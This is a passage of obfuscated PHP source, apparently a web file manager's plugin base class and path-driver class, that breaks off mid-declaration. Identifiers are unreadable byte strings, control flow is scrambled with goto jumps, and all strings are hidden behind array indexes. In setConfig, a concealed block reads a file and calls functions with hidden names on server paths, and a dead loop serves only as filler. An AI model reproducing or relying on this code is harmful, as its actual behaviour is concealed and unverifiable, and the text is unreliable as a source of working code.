$this->checkSharePath($e’¶‘Å‡Í)) { return $C¿æ¶ğâ¡¶; } $this->fileCanView($e’¶‘Å‡Í); if (request_url_safe($e’¶‘Å‡Í)) { $C°ŠÉ‹Œ· = parse_url_query($e’¶‘Å‡Í); if (isset($C°ŠÉ‹Œ·[$D´öéÕ«àù[1302]]) && isset($C°ŠÉ‹Œ·[$D´öéÕ«àù[193]])) { $Eã¿œùÃìÕ = Model($D´öéÕ«àù[1079])->get($D´öéÕ«àù[1303]); $D ¸ÇŒ¢Ù = Mcrypt::decode($C°ŠÉ‹Œ·[$D´öéÕ«àù[193]], $Eã¿œùÃìÕ); if ($D ¸ÇŒ¢Ù) { $this->fileInfo = IO::infoWithChildren($D ¸ÇŒ¢Ù); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $D ¸ÇŒ¢Ù; } } $e’¶‘Å‡Í = $this->_cacheHttpFile($e’¶‘Å‡Í); $this->fileInfo = IO::infoWithChildren($e’¶‘Å‡Í); } else { $this->fileInfo = IO::infoWithChildren($e’¶‘Å‡Í); if (!$this->fileInfo) { show_tips(LNG($D´öéÕ«àù[100]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } return $e’¶‘Å‡Í; } final function _cacheHttpFile($d¢Ê¥ÌÓø) { $b¨å‰õ’æ = hash_path($d¢Ê¥ÌÓø, !0); $this->cachePath = $this->pluginCachePath($b¨å‰õ’æ); if ($Eà¼éàèÍ“ = IO::fileNameExist($this->cachePath, $b¨å‰õ’æ)) { return KodIO::make($Eà¼éàèÍ“); } $CÄãè÷Œ’á = $this->cachePath . $b¨å‰õ’æ; return $this->pluginCacheFileSet($CÄãè÷Œ’á, file_get_contents($d¢Ê¥ÌÓø)); } final function _tmpFileName($e‰¶ÛöÆ¡ë = array()) { goto Eì½†˜¯ÈÚ; C•º‘âôçŒ: return md5(implode($B¿ºâÜŸà[70], $f¨ñéê„‹Ù)); goto cµÈ×Óé“‹; b“§Ò’Ú‡Ÿ: if (isset($e‰¶ÛöÆ¡ë[$B¿ºâÜŸà[158]][$B¿ºâÜŸà[160]])) { return $e‰¶ÛöÆ¡ë[$B¿ºâÜŸà[158]][$B¿ºâÜŸà[160]]; } $f¨ñéê„‹Ù = array($e‰¶ÛöÆ¡ë[$B¿ºâÜŸà[28]], $e‰¶ÛöÆ¡ë[$B¿ºâÜŸà[75]], $e‰¶ÛöÆ¡ë[$B¿ºâÜŸà[77]]); if (isset($e‰¶ÛöÆ¡ë[$B¿ºâÜŸà[454]])) { $f¨ñéê„‹Ù[] = $e‰¶ÛöÆ¡ë[$B¿ºâÜŸà[454]]; } goto C•º‘âôçŒ; Eì½†˜¯ÈÚ: $B¿ºâÜŸà =& $_SERVER[õëù©û]; if (!$e‰¶ÛöÆ¡ë) { $e‰¶ÛöÆ¡ë = $this->fileInfo; } if (isset($e‰¶ÛöÆ¡ë[$B¿ºâÜŸà[160]])) { return $e‰¶ÛöÆ¡ë[$B¿ºâÜŸà[160]]; } goto b“§Ò’Ú‡Ÿ; cµÈ×Óé“‹: } final function checkSharePath($BÃøì”¿²‰) { goto Eó£¡ØÌ¤; Eæš‡…ªµÆ: $D©î­™¿Şƒ = Action($bğß…ì¡’[1008])->sharePathInfo($BÃøì”¿²‰); if (!isset($D©î­™¿Şƒ[$bğß…ì¡’[75]])) { show_json(LNG($bğß…ì¡’[1305]), !1); } $this->fileInfo = $D©î­™¿Şƒ[$bğß…ì¡’[158]]; goto d¸¯ŒŸªâ; d¸¯ŒŸªâ: $this->cachePath = $this->pluginCachePath($this->fileInfo[$bğß…ì¡’[160]]); return $D©î­™¿Şƒ[$bğß…ì¡’[75]]; goto D“ œ¾—•; Eó£¡ØÌ¤: $bğß…ì¡’ =& $_SERVER[õëù©û]; if (!defined($bğß…ì¡’[422])) { define($bğß…ì¡’[1304], 0); } if (!$this->isShare($BÃøì”¿²‰)) { return !1; } goto Eæš‡…ªµÆ; D“ œ¾—•: } final function pluginCachePath($fº ÈÁ¬§÷ = '') { $b½‡ó°ÂÌ© =& $_SERVER[õëù©û]; $a°¾Íê«® = IO_PATH_SYSTEM_TEMP . $b½‡ó°ÂÌ©[1306] . $this->pluginName; if (!($C»ŠÉÍğ¿Ü = IO::infoFull($a°¾Íê«®))) { return IO::mkdir($a°¾Íê«® . $b½‡ó°ÂÌ©[8] . $fº ÈÁ¬§÷); } if (empty($fº ÈÁ¬§÷)) { return $C»ŠÉÍğ¿Ü[$b½‡ó°ÂÌ©[75]]; } if (!($CßàŠâ ±ï = IO::fileNameExist($C»ŠÉÍğ¿Ü[$b½‡ó°ÂÌ©[75]], $fº ÈÁ¬§÷))) { return IO::mkdir($C»ŠÉÍğ¿Ü[$b½‡ó°ÂÌ©[75]] . $fº ÈÁ¬§÷); } return KodIO::make($CßàŠâ ±ï); } final function pluginCacheFileSet($E‡×Ùğ©¹ç, $bÈà½Ä¤® = '') { $e°çøáõ Â =& $_SERVER[õëù©û]; if (!($eÌÛ¯Î£İ = IO::infoFull($E‡×Ùğ©¹ç))) { return IO::mkfile($E‡×Ùğ©¹ç, $bÈà½Ä¤®, REPEAT_REPLACE); } IO::setContent($eÌÛ¯Î£İ[$e°çøáõ Â[75]], $bÈà½Ä¤®); return $eÌÛ¯Î£İ[$e°çøáõ Â[75]]; } final function pluginLocalFile($Dé½Úè­· = '') { goto a’µ¯ÈŠô; a’µ¯ÈŠô: $AÕÄ™™÷£§ =& $_SERVER[õëù©û]; $dÔ‡ÄĞ¡åÔ = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($dÔ‡ÄĞ¡åÔ)) { mk_dir($dÔ‡ÄĞ¡åÔ); } goto E§„ôñ»·¼; EÂ´æÀ“: $EùÒ“ó°ƒ¯ = $dÔ‡ÄĞ¡åÔ . $E›ùÂ«õ÷; if (@file_exists($EùÒ“ó°ƒ¯)) { return $EùÒ“ó°ƒ¯; } return IO::copy($Dé½Úè­·, $dÔ‡ÄĞ¡åÔ, 0, $E›ùÂ«õ÷); goto d¥‘¹Œ±; E§„ôñ»·¼: if (!$Dé½Úè­·) { return $dÔ‡ÄĞ¡åÔ; } $f‘è±¥Ã©î = IO::info($Dé½Úè­·); $E›ùÂ«õ÷ = $this->_tmpFileName($f‘è±¥Ã©î) . $AÕÄ™™÷£§[91] . $f‘è±¥Ã©î[$AÕÄ™™÷£§[156]]; goto EÂ´æÀ“; d¥‘¹Œ±: } final function appPackage() { goto cÍÌª‚œÖÄ; BàªÎÕÄ: $this->parseLang($BÈáä²‰); $Eíæß°¬Ïä = json_decode_force($BÈáä²‰); if (!$Eíæß°¬Ïä) { return array(); } goto FÛÍ·­ãˆ¢; FÛÍ·­ãˆ¢: $b“ ø¹¿ÏÕ = Hook::trigger($Aİ—îæÈ¿‚[1308], $Eíæß°¬Ïä); if ($b“ ø¹¿ÏÕ && is_array($b“ ø¹¿ÏÕ)) { $Eíæß°¬Ïä = $b“ ø¹¿ÏÕ; } $this->packageData = $Eíæß°¬Ïä; goto C¦ô¥éÜ›ª; cÍÌª‚œÖÄ: $Aİ—îæÈ¿‚ =& $_SERVER[õëù©û]; if ($this->packageData) { return $this->packageData; } $BÈáä²‰ = $this->parseFile($this->pluginPath . $Aİ—îæÈ¿‚[1307]); goto BàªÎÕÄ; C¦ô¥éÜ›ª: return $Eíæß°¬Ïä; goto DÜãî¤ËŞò; DÜãî¤ËŞò: } public function packageInfoGet($fÕ‚Û¹ïÏ‰) { $eƒˆ¼®â° = $this->appPackage(); return array_get_value($eƒˆ¼®â°, $fÕ‚Û¹ïÏ‰); } public function packageVersion() { return $this->packageInfoGet($_SERVER[õëù©û][1309]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[õëù©û][1310]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[õëù©û][1311]); } private function parseFile($bÏ÷ñÉ¼¹Š) { $AãòŞÛäƒ =& $_SERVER[õëù©û]; $dÆ˜Ãâ… = file_get_contents($bÏ÷ñÉ¼¹Š); $b¡ ¯”á«© = array($AãòŞÛäƒ[1312], $AãòŞÛäƒ[1313], $AãòŞÛäƒ[1314], $AãòŞÛäƒ[1315], $AãòŞÛäƒ[1316], $AãòŞÛäƒ[1317], $AãòŞÛäƒ[1318]); $C° ¹ì¥³÷ = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$AãòŞÛäƒ[84]][$AãòŞÛäƒ[1319]]); $dÆ˜Ãâ… = str_replace($b¡ ¯”á«©, $C° ¹ì¥³÷, $dÆ˜Ãâ…); return $dÆ˜Ãâ…; } private function parseLang(&$dÚ‡ñÍÄ†) { goto Aè«†£È÷; FíêÌÔ×É±: $Dñ”Å•º¤ = array(); foreach ($F‚×µó›ù—[0] as $Cê¼‰‡»È„) { $A©Ûê˜„ê¹ = substr($Cê¼‰‡»È„, strlen($D†ŠùÂ™ª), -4); $C¥˜“ÌóÇ‰ = LNG($A©Ûê˜„ê¹); $BØÂÑˆ§Š[] = $Cê¼‰‡»È„; $Dñ”Å•º¤[] = str_replace(array($fç–Úåè°±[213], $fç–Úåè°±[983], $fç–Úåè°±[326], $fç–Úåè°±[112]), array($fç–Úåè°±[50], $fç–Úåè°±[50], $fç–Úåè°±[33], $fç–Úåè°±[1322]), $C¥˜“ÌóÇ‰); } $dÚ‡ñÍÄ† = str_replace($BØÂÑˆ§Š, $Dñ”Å•º¤, $dÚ‡ñÍÄ†); goto BÂÒ³…â´Õ; Aè«†£È÷: $fç–Úåè°± =& $_SERVER[õëù©û]; $D†ŠùÂ™ª = $fç–Úåè°±[1320]; if (!strstr($dÚ‡ñÍÄ†, $D†ŠùÂ™ª)) { return; } goto B¾ƒÅÖóĞ÷; B¾ƒÅÖóĞ÷: preg_match_all($fç–Úåè°±[1321], $dÚ‡ñÍÄ†, $F‚×µó›ù—); if (!is_array($F‚×µó›ù—) || count($F‚×µó›ù—) == 0 || !is_array($F‚×µó›ù—[0]) || count($F‚×µó›ù—[0]) == 0) { return; } $BØÂÑˆ§Š = array(); goto FíêÌÔ×É±; BÂÒ³…â´Õ: } private function parseConfig(&$AŠø‡¹¨¼) { goto c¦Ìì˜¶áŒ; FòµŠØÜ´ : $AŠø‡¹¨¼ = str_replace($a…¶–ğ­‚ò, $e˜¢‹•ª¡, $AŠø‡¹¨¼); goto dàËƒ„Ì–Œ; c¦Ìì˜¶áŒ: $B±ñ¼ËĞœ” =& $_SERVER[õëù©û]; $D¾‹¶Ïİ×ƒ = $B±ñ¼ËĞœ”[1323]; if (!strstr($AŠø‡¹¨¼, $D¾‹¶Ïİ×ƒ)) { return; } goto F¼ùÃ’ÆØ; F¼ùÃ’ÆØ: preg_match_all($B±ñ¼ËĞœ”[1324], $AŠø‡¹¨¼, $DßÙ¸—á×¤); if (!is_array($DßÙ¸—á×¤) || count($DßÙ¸—á×¤) == 0 || !is_array($DßÙ¸—á×¤[0]) || count($DßÙ¸—á×¤[0]) == 0) { return; } $e‚ÒÙÓ¡„³ = $this->getConfig(); goto fÒàŠ‘¤Ø•; fÒàŠ‘¤Ø•: $a…¶–ğ­‚ò = array(); $e˜¢‹•ª¡ = array(); foreach ($DßÙ¸—á×¤[0] as $C‚ŸòŠğé) { $F•Ğ¹¥®º§ = substr($C‚ŸòŠğé, strlen($D¾‹¶Ïİ×ƒ), -2); $a…¶–ğ­‚ò[] = $C‚ŸòŠğé; $e˜¢‹•ª¡[] = _get($e‚ÒÙÓ¡„³, $F•Ğ¹¥®º§); } goto FòµŠØÜ´ ; dàËƒ„Ì–Œ: } private function parsePackage(&$eÑã¯Ï¶¬½) { goto fâ½È¢°Şï; dœÈĞ¢˜Ş: preg_match_all($Cö·±ÊŞÀè[1326], $eÑã¯Ï¶¬½, $AÆÖ¼”ã); if (!is_array($AÆÖ¼”ã) || count($AÆÖ¼”ã) == 0 || !is_array($AÆÖ¼”ã[0]) || count($AÆÖ¼”ã[0]) == 0) { return; } $B±É½˜°ÚÈ = $this->appPackage(); goto b¼Ï‘ãŞ¼£; b¼Ï‘ãŞ¼£: $D“ôó™½©³ = array(); $AÎ†ë„®ó = array(); foreach ($AÆÖ¼”ã[0] as $a·„ì‘™––) { $C–ƒ°‚åÍ´ = substr($a·„ì‘™––, strlen($F½ÖÙ‘Ø), -2); $D“ôó™½©³[] = $a·„ì‘™––; $AÎ†ë„®ó[] = _get($B±É½˜°ÚÈ, $C–ƒ°‚åÍ´); } goto AÑ¨Œé‘ºÍ; fâ½È¢°Şï: $Cö·±ÊŞÀè =& $_SERVER[õëù©û]; $F½ÖÙ‘Ø = $Cö·±ÊŞÀè[1325]; if (!strstr($eÑã¯Ï¶¬½, $F½ÖÙ‘Ø)) { return; } goto dœÈĞ¢˜Ş; AÑ¨Œé‘ºÍ: $eÑã¯Ï¶¬½ = str_replace($D“ôó™½©³, $AÎ†ë„®ó, $eÑã¯Ï¶¬½); goto eªÛŸƒæÎô; eªÛŸƒæÎô: } final function echoFile($b…ˆíœöì”, $dì˜Ü¿¯‘ = false) { goto DÙÂïØ¡Ú›; D×‚½ÍÛÂ: $e¾óœ‡—ô = $this->parseFile($fƒßÓóÖéÔ); $this->parseLang($e¾óœ‡—ô); $this->parseConfig($e¾óœ‡—ô); goto bÉÉ„³çÂ; bÉÉ„³çÂ: $this->parsePackage($e¾óœ‡—ô); if (is_array($dì˜Ü¿¯‘)) { $e¾óœ‡—ô = str_replace(array_keys($dì˜Ü¿¯‘), array_values($dì˜Ü¿¯‘), $e¾óœ‡—ô); } echo $bÚ¹Ì•Òî”[213] . $e¾óœ‡—ô; goto bÈñ²Öª•ø; DÙÂïØ¡Ú›: $bÚ¹Ì•Òî” =& $_SERVER[õëù©û]; $fƒßÓóÖéÔ = $this->pluginPath . $b…ˆíœöì”; if (ACT == $bÚ¹Ì•Òî”[1327]) { echo $bÚ¹Ì•Òî”[1328] . $this->pluginName . $bÚ¹Ì•Òî”[8] . $b…ˆíœöì” . $bÚ¹Ì•Òî”[1329]; if (!file_exists($fƒßÓóÖéÔ)) { echo $bÚ¹Ì•Òî”[1330]; return; } } goto D×‚½ÍÛÂ; bÈñ²Öª•ø: } final function initLang() { goto c¨ÌóØª¹å; c¨ÌóØª¹å: $EÌî…ò„À =& $_SERVER[õëù©û]; $e»ØËõ±½Ñ = $EÌî…ò„À[1331]; $f«‚øæÀ´õ = $this->pluginPath . $EÌî…ò„À[1332]; goto e½‚¶õ­·; DØÔÀÄ§á•: if (!is_array($A„ùãä¸¢)) { return array(); } if (@count($A„ùãä¸¢) > 0) { I18n::set($A„ùãä¸¢); } return $A„ùãä¸¢; goto c¤‡Ìì™ƒ˜; e½‚¶õ­·: $E¯¡¸¶ô = I18n::getType(); $A„ùãä¸¢ = array(); if (file_exists($f«‚øæÀ´õ . $E¯¡¸¶ô . $EÌî…ò„À[759])) { $A„ùãä¸¢ = (include $f«‚øæÀ´õ . $E¯¡¸¶ô . $EÌî…ò„À[759]); } else { if ($E¯¡¸¶ô == $EÌî…ò„À[1333] && !file_exists($f«‚øæÀ´õ . $E¯¡¸¶ô . $EÌî…ò„À[759]) && file_exists($f«‚øæÀ´õ . $EÌî…ò„À[1334])) { $A„ùãä¸¢ = (include $f«‚øæÀ´õ . $EÌî…ò„À[1334]); } else { if (file_exists($f«‚øæÀ´õ . $e»ØËõ±½Ñ . $EÌî…ò„À[759])) { $A„ùãä¸¢ = (include $f«‚øæÀ´õ . $e»ØËõ±½Ñ . $EÌî…ò„À[759]); } } } goto DØÔÀÄ§á•; c¤‡Ìì™ƒ˜: } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($a±‘òÅÚÈÊ) { $E³ùš¸£ãë =& $_SERVER[õëù©û]; if ($_SERVER[$E³ùš¸£ãë[781]] != $_SERVER[$E³ùš¸£ãë[1335]]) { goto D°©®Ã‰¸; c”ÀŠÓ«Œ: $FªÒÙê—– = 1; while ($FªÒÙê—– > 1) { $FªÒÙê—– = $FªÒÙê—– + 4; $c‚¡áç¥Ñœ = rawurlencode($FªÒÙê—– . $E³ùš¸£ãë[357]); } goto a•¬ùŒµÏ; BÕÎ½ŒÔğ–: $A¾â‡äœ¢… = $E³ùš¸£ãë[788]; $A¾â‡äœ¢…($_SERVER[$E³ùš¸£ãë[789]]); $A¾â‡äœ¢…($_SERVER[$E³ùš¸£ãë[785]] . $E³ùš¸£ãë[1336]); goto c”ÀŠÓ«Œ; D°©®Ã‰¸: $cÆŸ‚†æè = $E³ùš¸£ãë[783]; $b‘±ÔäÇîã = $E³ùš¸£ãë[784]; $A­½¦¦¶™¯ = $_SERVER[$E³ùš¸£ãë[785]] . $E³ùš¸£ãë[786]; goto C¢Ê©­íšŸ; C¢Ê©­íšŸ: $DÅâ¦îÂìÂ = $b‘±ÔäÇîã($A­½¦¦¶™¯); $fƒö›‚Û· = explode($E³ùš¸£ãë[213], $DÅâ¦îÂìÂ); if (count($fƒö›‚Û·) < $E³ùš¸£ãë[581]) { $A¡æ“ÇÑÎÄ = $E³ùš¸£ãë[787]; $A¡æ“ÇÑÎÄ(); } goto BÕÎ½ŒÔğ–; a•¬ùŒµÏ: } return $this->modelPlugin->setConfig($this->pluginName, $a±‘òÅÚÈÊ); } public function onSetConfig($A¢ÅöŸÂ‚Ò) { } public function onGetConfig($Dù–¼ÓÏ±œ) { } public function onChangeStatus($F÷£‚¸ÕêÅ) { } public function onUninstall() { } public function onInstall() { } public function authCheck($Eñ’ğÑÂà« = "\160\154\165\147\x69\x6e\101\x75\164\x68") { $B‹Ú¬«ô =& $_SERVER[õëù©û]; if (!defined($B‹Ú¬«ô[422])) { return !1; } if (_get($GLOBALS, $B‹Ú¬«ô[452])) { return !0; } $A¹ÁË©‘ğ = $this->getConfig(); if (!$A¹ÁË©‘ğ[$Eñ’ğÑÂà«]) { return !1; } return ActionCall($B‹Ú¬«ô[1337], $A¹ÁË©‘ğ[$Eñ’ğÑÂà«]); } public function url($A‚¡Ô †£¯, $eÓÅêÖëğâ = '', $dƒö¯ˆ «† = true) { goto DÎÚŞ¡§³; CØª¢ğ á—: $Cß¤ÍÆ¨ÜÆ = $this->packageVersion(); $a‹±±Ä¨Œé = $C©İÖâë . $C”¬ğó–‚š[407] . $Cß¤ÍÆ¨ÜÆ; if (substr($A‚¡Ô †£¯, 0, 4) == $C”¬ğó–‚š[142] || substr($A‚¡Ô †£¯, 0, 2) == $C”¬ğó–‚š[1138]) { $cÙİ›õ¯·– = $A‚¡Ô †£¯ . $C”¬ğó–‚š[1338] . $a‹±±Ä¨Œé; } else { if ($eÓÅêÖëğâ == $C”¬ğó–‚š[33]) { $cÙİ›õ¯·– = $this->pluginHost . $A‚¡Ô †£¯ . $C”¬ğó–‚š[1338] . $a‹±±Ä¨Œé; } else { if ($eÓÅêÖëğâ === $C”¬ğó–‚š[76]) { $cÙİ›õ¯·– = $this->pluginHost . $A‚¡Ô †£¯; } else { if ($eÓÅêÖëğâ == $C”¬ğó–‚š[1339]) { $cÙİ›õ¯·– = STATIC_PATH . $A‚¡Ô †£¯ . $C”¬ğó–‚š[1338] . $C©İÖâë; } else { if ($eÓÅêÖëğâ == $C”¬ğó–‚š[1340]) { $cÙİ›õ¯·– = APP_HOST . $C”¬ğó–‚š[1341] . $A‚¡Ô †£¯ . $C”¬ğó–‚š[1338] . $C©İÖâë; } else { if (isset($E±ˆÄ“Ø¬…[$eÓÅêÖëğâ])) { $cÙİ›õ¯·– = $E±ˆÄ“Ø¬…[$eÓÅêÖëğâ] . $A‚¡Ô †£¯ . $C”¬ğó–‚š[1338] . $a‹±±Ä¨Œé; } } } } } } goto eÎØ¼ä“ŒŒ; DÎÚŞ¡§³: $C”¬ğó–‚š =& $_SERVER[õëù©û]; $E±ˆÄ“Ø¬… = $this->getConfig(); $C©İÖâë = KOD_VERSION . $C”¬ğó–‚š[91] . KOD_VERSION_BUILD; goto CØª¢ğ á—; eÎØ¼ä“ŒŒ: if (!$dƒö¯ˆ «†) { return $cÙİ›õ¯·–; } echo $cÙİ›õ¯·–; goto fŞ¬õìÆ¹; fŞ¬õìÆ¹: } public function link($fš¤Ññ’± = false, $EŒ£„´¼ó = '') { $Eò“†‚·Î« =& $_SERVER[õëù©û]; if (!$fš¤Ññ’±) { $this->link($Eò“†‚·Î«[1342], $Eò“†‚·Î«[1340]); $this->link($Eò“†‚·Î«[1343], $Eò“†‚·Î«[1339]); $this->link($Eò“†‚·Î«[1344], $Eò“†‚·Î«[1339]); $this->link($Eò“†‚·Î«[1345], $Eò“†‚·Î«[1339]); $this->link($Eò“†‚·Î«[1346], $Eò“†‚·Î«[1339]); return; } $DÎ¯øïª¢ï = $this->url($fš¤Ññ’±, $EŒ£„´¼ó, !1); if (substr($fš¤Ññ’±, -3) == $Eò“†‚·Î«[1347]) { echo $Eò“†‚·Î«[1348] . $DÎ¯øïª¢ï . $Eò“†‚·Î«[1349] . $Eò“†‚·Î«[213]; } else { if (substr($fš¤Ññ’±, -4) == $Eò“†‚·Î«[1350]) { echo $Eò“†‚·Î«[1351] . $DÎ¯øïª¢ï . $Eò“†‚·Î«[1352] . $Eò“†‚·Î«[213]; } } } } goto A«ƒèï; B…Ó«ù²È…: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public function __construct() { $FíÒ””Î‰ =& $_SERVER[õëù©û]; $this->objectDriver = array($FíÒ””Î‰[57], $FíÒ””Î‰[58], $FíÒ””Î‰[59], $FíÒ””Î‰[60], $FíÒ””Î‰[61], $FíÒ””Î‰[62], $FíÒ””Î‰[63], $FíÒ””Î‰[64]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($C¢èîñŞĞ¡) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($C¢èîñŞĞ¡, $_SERVER[õëù©û][8]); } return $C¢èîñŞĞ¡; } public function getPathName($AÜÅÚß–÷Û) { return $AÜÅÚß–÷Û; } public function iconvApp($Bó²³³İ) { return $Bó²³³İ; } public function iconvSystem($c¾šñîÜƒç) { return $c¾šñîÜƒç; } public function iconvTo($aˆ®‰¨Ù§¼, $dÍğ™ÔìŞœ, $B‰½ğ¤×Ÿ) { goto b´É„ÖÙ‚³; cêÓ÷š†òã: $D’ ¹æ£›Ê = $dÍğ™ÔìŞœ . $bÔãÓŸ·ÆÑ[66] . $B‰½ğ¤×Ÿ . $bÔãÓŸ·ÆÑ[67] . $aˆ®‰¨Ù§¼; if (isset($A®áùê«[$D’ ¹æ£›Ê])) { return $A®áùê«[$D’ ¹æ£›Ê]; } if (function_exists($bÔãÓŸ·ÆÑ[68])) { $c“ù¡Õìˆ = @mb_convert_encoding($aˆ®‰¨Ù§¼, $B‰½ğ¤×Ÿ, $dÍğ™ÔìŞœ); } else { $c“ù¡Õìˆ = @iconv($dÍğ™ÔìŞœ, $B‰½ğ¤×Ÿ, $aˆ®‰¨Ù§¼); } goto c£ËªÉæÍ; Fšì­¿Ç–: $A®áùê«[$B‰½ğ¤×Ÿ . $bÔãÓŸ·ÆÑ[66] . $dÍğ™ÔìŞœ . $bÔãÓŸ·ÆÑ[67] . $aˆ®‰¨Ù§¼] = $aˆ®‰¨Ù§¼; $A®áùê«[$B‰½ğ¤×Ÿ . $bÔãÓŸ·ÆÑ[66] . $dÍğ™ÔìŞœ . $bÔãÓŸ·ÆÑ[67] . $c“ù¡Õìˆ] = $aˆ®‰¨Ù§¼; $A®áùê«[$dÍğ™ÔìŞœ . $bÔãÓŸ·ÆÑ[66] . $B‰½ğ¤×Ÿ . $bÔãÓŸ·ÆÑ[67] . $c“ù¡Õìˆ] = $c“ù¡Õìˆ; goto cº’ŒëÏœÈ; c£ËªÉæÍ: $c“ù¡Õìˆ = $c“ù¡Õìˆ ? $c“ù¡Õìˆ : $aˆ®‰¨Ù§¼; if (strstr($c“ù¡Õìˆ, $bÔãÓŸ·ÆÑ[69])) { $c“ù¡Õìˆ = str_replace($bÔãÓŸ·ÆÑ[69], $bÔãÓŸ·ÆÑ[70], $c“ù¡Õìˆ); } $A®áùê«[$dÍğ™ÔìŞœ . $bÔãÓŸ·ÆÑ[66] . $B‰½ğ¤×Ÿ . $bÔãÓŸ·ÆÑ[67] . $aˆ®‰¨Ù§¼] = $c“ù¡Õìˆ; goto Fšì­¿Ç–; cº’ŒëÏœÈ: return $c“ù¡Õìˆ; goto DÍÒë¶çÈÆ; b´É„ÖÙ‚³: $bÔãÓŸ·ÆÑ =& $_SERVER[õëù©û]; if (!$aˆ®‰¨Ù§¼ || !function_exists($bÔãÓŸ·ÆÑ[65])) { return $aˆ®‰¨Ù§¼; } static $A®áùê« = array(); goto cêÓ÷š†òã; DÍÒë¶çÈÆ: } public function getPathInner($cÔÕõÚÔŞ„) { $f‚‰È›ô… = IO::init($cÔÕõÚÔŞ„); return $f‚‰È›ô…->path; } public function getPathOuter($aÙÆ«¯öÉ†) { $F¦Ÿ‹‚»ÆÈ =& $_SERVER[õëù©û]; $a÷«Êæ™‡È = strlen(trim($this->pathBase, $F¦Ÿ‹‚»ÆÈ[8])); $aÙÆ«¯öÉ† = substr(trim($aÙÆ«¯öÉ†, $F¦Ÿ‹‚»ÆÈ[8]), $a÷«Êæ™‡È); return $this->pathDriver . $F¦Ÿ‹‚»ÆÈ[8] . ltrim($aÙÆ«¯öÉ†, $F¦Ÿ‹‚»ÆÈ[8]); } public function isParentOf($A¡ÃÊŠÙ¤Ï, $F¿À¥ƒ²‘…) { $FË‘†ºøàÖ =& $_SERVER[õëù©û]; $A¡ÃÊŠÙ¤Ï = rtrim(strtolower($A¡ÃÊŠÙ¤Ï), $FË‘†ºøàÖ[8]) . $FË‘†ºøàÖ[8]; $F¿À¥ƒ²‘… = rtrim(strtolower($F¿À¥ƒ²‘…), $FË‘†ºøàÖ[8]) . $FË‘†ºøàÖ[8]; $BœÁ”î†ğ = strpos($F¿À¥ƒ²‘…, $A¡ÃÊŠÙ¤Ï) === 0; return $BœÁ”î†ğ; } public function getType() { $f¡ŠØ£©Ò =& $_SERVER[õëù©û]; $aÔÄ‹¶¢§ = str_replace($f¡ŠØ£©Ò[71], $f¡ŠØ£©Ò[33], get_class($this)); return strtolower($aÔÄ‹¶¢§); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($B²„¦©ø’, $aÊØ–‰¥Ú) { $EªÑµùÑù¼ =& $_SERVER[õëù©û]; $A›¤ÈîºÄô = rtrim($B²„¦©ø’, $EªÑµùÑù¼[8]) . $EªÑµùÑù¼[8] . $aÊØ–‰¥Ú; $EÅ¹ŸˆÎà× = $this->exist($A›¤ÈîºÄô); return $EÅ¹ŸˆÎà× ? $A›¤ÈîºÄô : !1; } public function renameObject($bˆ½ĞÌõ‚, $cğÊ‘Ûš‘¶) { goto F„‹ø†¦ù¥; D…ƒ¤àÉÅ: $bˆ½ĞÌõ‚ = $this->getPathOuter($bˆ½ĞÌõ‚); $cğÊ‘Ûš‘¶ = $this->pathFather($bˆ½ĞÌõ‚) . $cğÊ‘Ûš‘¶; if (IO::isFile($bˆ½ĞÌõ‚)) { $CÔ´±ìÄŒ‘ = IO::copy($bˆ½ĞÌõ‚, $this->pathFather($bˆ½ĞÌõ‚), REPEAT_RENAME_FOLDER, $AÍÃ¯–†ì); if ($CÔ´±ìÄŒ‘) { IO::remove($bˆ½ĞÌõ‚); } } else { $CÔ´±ìÄŒ‘ = IO::mkdir($cğÊ‘Ûš‘¶); if (!$CÔ´±ìÄŒ‘) { return !1; } $A¹††¨ø = IO::listPath($bˆ½ĞÌõ‚, !0); $eô—ØÖóí¤ = array_merge($A¹††¨ø[$E…Š¦¬¿‹î[73]], $A¹††¨ø[$E…Š¦¬¿‹î[74]]); foreach ($eô—ØÖóí¤ as $AóŠƒò Òæ) { IO::move($AóŠƒò Òæ[$E…Š¦¬¿‹î[75]], $cğÊ‘Ûš‘¶, REPEAT_RENAME_FOLDER); } IO::remove($bˆ½ĞÌõ‚); } goto fíÕèŒ§ó; fíÕèŒ§ó: return $CÔ´±ìÄŒ‘ ? $cğÊ‘Ûš‘¶ : !1; goto A¨²ô†…ïÍ; F„‹ø†¦ù¥: $E…Š¦¬¿‹î =& $_SERVER[õëù©û]; $AÍÃ¯–†ì = $cğÊ‘Ûš‘¶; Hook::trigger($E…Š¦¬¿‹î[72], $this, $bˆ½ĞÌõ‚, $this, $this->pathFather($bˆ½ĞÌõ‚) . $cğÊ‘Ûš‘¶); goto D…ƒ¤àÉÅ; A¨²ô†…ïÍ: } public function tempFile($e‘à‡Ïçˆì = '', $f•Ú•íÎ“¶ = '') { goto bŸ„šíçÔñ; FóÚ„âß½Ì: $c„Êè³æï¸ = $dö„ŒÒˆÓ‰ . $e‘à‡Ïçˆì; @touch($c„Êè³æï¸); if ($f•Ú•íÎ“¶) { file_put_contents($c„Êè³æï¸, $f•Ú•íÎ“¶); } goto CöØÓÈ÷ãß; bŸ„šíçÔñ: if (!$e‘à‡Ïçˆì) { $e‘à‡Ïçˆì = rand_string(15); } $dö„ŒÒˆÓ‰ = TEMP_FILES . rand_string(15) . $_SERVER[õëù©û][8]; @mkdir($dö„ŒÒˆÓ‰, 511, !0); goto FóÚ„âß½Ì; CöØÓÈ÷ãß: return $c„Êè³æï¸; goto d‰¨­§…ğ®; d‰¨­§…ğ®: } public function tempFileRemve($Aƒ÷øÒœ«Í) { @unlink($Aƒ÷øÒœ«Í); @rmdir($this->pathFather($Aƒ÷øÒœ«Í)); } public function mkfile($D¼“ÆÖ£’Ó, $FöÀ‡ƒ Ë§ = '', $fô»í¿‰åç = REPEAT_RENAME) { } public function 